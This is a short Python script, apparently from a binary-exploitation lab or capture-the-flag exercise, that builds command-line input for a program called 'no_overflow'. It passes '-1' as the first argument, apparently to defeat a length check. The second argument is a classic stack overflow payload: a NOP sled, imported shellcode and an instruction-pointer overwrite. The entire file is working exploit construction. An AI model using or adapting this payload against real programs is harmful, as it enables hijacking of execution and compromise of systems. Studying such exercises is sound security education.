from toimport import *
from math import *

programname = "no_overflow"
input_type = Input.args
buff_size = 256
def calcArgs():
    global args
    args = [None] * 2 #2 is number of arugments
    args[0] = str(-1)
    args[1] = vals.NOP*(int(buff_size/2) + vals.offset - len(vals.shellcode)) + vals.shellcode + vals.NOP*(int(buff_size/2)) + vals.eipoverride

